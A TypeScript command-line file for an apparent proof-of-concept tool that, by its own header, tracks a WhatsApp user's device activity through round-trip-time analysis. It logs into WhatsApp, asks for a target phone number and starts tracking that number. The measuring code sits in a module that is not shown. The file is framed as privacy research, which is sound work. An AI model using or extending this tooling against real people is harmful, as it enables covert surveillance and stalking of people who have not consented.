/**
 * Device Activity Tracker - CLI Interface
 *
 * This is a proof-of-concept tool demonstrating privacy vulnerabilities
 * in messaging apps (in this case WhatsApp) through RTT-based activity analysis.
 *
 * For educational and research purposes only.
 */

const debugMode = process.argv.includes('--debug') || process.argv.includes('-d');
const originalConsoleLog = console.log;
const originalStdoutWrite = process.stdout.write.bind(process.stdout);

// prevents Baileys from spamming the console
const shouldSuppressOutput = (message: string): boolean => {
    return message.includes('Closing session:') ||
           message.includes('SessionEntry') ||
           message.includes('_chains') ||
           message.includes('registrationId') ||
           message.includes('currentRatchet') ||
           message.includes('ephemeralKeyPair') ||
           message.includes('pendingPreKey') ||
           message.includes('indexInfo') ||
           message.includes('baseKey') ||
           message.includes('remoteIdentityKey') ||
           message.includes('lastRemoteEphemeralKey') ||
           message.includes('previousCounter') ||
           message.includes('rootKey') ||
           message.includes('signedKeyId') ||
           message.includes('preKeyId') ||
           message.includes('<Buffer');
};

if (!debugMode) {
    // Override console.log
    console.log = (...args: any[]) => {
        const message = String(args[0] || '');
        if (!shouldSuppressOutput(message)) {
            originalConsoleLog(...args);
        }
    };

    // Override process.stdout.write to catch low-level output
    process.stdout.write = ((chunk: any, encoding?: any, callback?: any): boolean => {
        const message = String(chunk);
        if (shouldSuppressOutput(message)) {
            // Suppress - but still call callback if provided
            if (typeof encoding === 'function') {
                encoding();
            } else if (typeof callback === 'function') {
                callback();
            }
            return true;
        }
        return originalStdoutWrite(chunk, encoding, callback);
    }) as typeof process.stdout.write;
}

// Now safe to import modules
import '@whiskeysockets/baileys';
import makeWASocket, { DisconnectReason, useMultiFileAuthState } from '@whiskeysockets/baileys';
import { pino } from 'pino';
import { Boom } from '@hapi/boom';
import qrcode from 'qrcode-terminal';
import { WhatsAppTracker } from './tracker.js';
import * as readline from 'readline';

if (debugMode) {
    originalConsoleLog('🔍 Debug mode enabled\n');
} else {
    originalConsoleLog('📊 Normal mode (important outputs only)\n');
    originalConsoleLog('💡 Tip: Use --debug or -d for detailed debug output\n');
}

let currentTargetJid: string | null = null;
let currentTracker: WhatsAppTracker | null = null;

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');

    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        markOnlineOnConnect: true,
    });

    originalConsoleLog('🔌 Connecting to WhatsApp... (use the --debug flag for more details)');

    let isConnected = false;

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            qrcode.generate(qr, { small: true });
        }

        if (connection === 'close') {
            isConnected = false;
            // Stop the tracker if it's running, as the socket is dead
            if (currentTracker) {
                currentTracker.stopTracking();
                currentTracker = null;
            }

            const shouldReconnect = (lastDisconnect?.error as Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (debugMode) {
                originalConsoleLog('connection closed due to ', lastDisconnect?.error, ', reconnecting ', shouldReconnect);
            }
            if (shouldReconnect) {
                connectToWhatsApp();
            }
        } else if (connection === 'open') {
            originalConsoleLog('✅ Connected to WhatsApp');
            isConnected = true;

            if (currentTargetJid) {
                if (debugMode) {
                    originalConsoleLog(`Resuming tracking for ${currentTargetJid}...`);
                }
                currentTracker = new WhatsAppTracker(sock, currentTargetJid, debugMode);
                currentTracker.startTracking();
            } else {
                askForTarget();
            }
        } else {
            if (debugMode) {
                originalConsoleLog('connection update', update);
            }
        }
    });

    sock.ev.on('creds.update', saveCreds);

    const askForTarget = () => {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        rl.question('Enter target phone number (with country code, e.g., 491701234567): ', async (number) => {
            // Basic cleanup
            const cleanNumber = number.replace(/\D/g, '');

            if (cleanNumber.length < 10) {
                originalConsoleLog('Invalid number format. Please try again.');
                rl.close();
                askForTarget();
                return;
            }

            const targetJid = cleanNumber + '@s.whatsapp.net';

            if (debugMode) {
                originalConsoleLog(`Verifying ${targetJid}...`);
            }
            try {
                const results = await sock.onWhatsApp(targetJid);
                const result = results?.[0];

                if (result?.exists) {
                    currentTargetJid = result.jid;
                    currentTracker = new WhatsAppTracker(sock, result.jid, debugMode);
                    currentTracker.startTracking();
                    originalConsoleLog(`✅ Tracking started for ${result.jid}`);
                    rl.close();
                } else {
                    originalConsoleLog('❌ Number not registered on WhatsApp.');
                    rl.close();
                    askForTarget();
                }
            } catch (err) {
                console.error('Error verifying number:', err);
                rl.close();
                askForTarget();
            }
        });
    };
}

connectToWhatsApp();
